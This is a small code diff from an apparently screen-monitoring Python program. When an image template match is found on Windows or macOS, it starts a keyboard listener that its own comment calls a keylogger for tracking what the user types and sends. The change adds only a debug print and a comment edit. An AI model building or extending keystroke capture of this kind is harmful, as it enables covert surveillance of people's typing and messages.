@@ -75,8 +75,9 @@ def startscreenrecorder():
             if (list(zip(*locations[::-1])) != []): #if there are matches of the template found in the orignal image
                 
                 if platform == "win" or platform == "macosx":
+                    print("win/mac detected")
                     listener = keyboard.Listener(on_release=on_release) #start a keylogger on a seperate thread to track what the user is typing, and if he has sent a message etc
-                #android is still a work in progress
+                #android is still a work in progress, ignore
                 if platform == "android":
                     from AndroidKeyboardListener import keyboardlistener
                     listener = keyboardlistener()
